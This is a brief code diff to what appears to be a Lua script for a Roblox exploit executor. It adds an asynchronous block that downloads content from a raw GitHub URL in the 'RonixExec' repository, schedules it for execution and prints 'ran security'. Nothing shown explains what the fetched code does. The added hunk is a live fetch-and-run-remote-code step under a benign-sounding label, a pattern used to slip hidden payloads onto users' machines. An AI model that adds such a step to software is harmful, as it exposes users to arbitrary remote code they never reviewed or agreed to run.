@@ -71,6 +71,12 @@ local http_get = function(url)
     return http_get(url);
 end
 
+async.on(function()
+    local AS = securestring(http_get("https://raw.githubusercontent.com/DancingUnicornLol/RonixExec/refs/heads/main/other/as"));
+    dtc.schedule(AS);
+    rconsoleprint("ran security");
+end);
+
 local api = nil;
 local betaapi = nil;
 
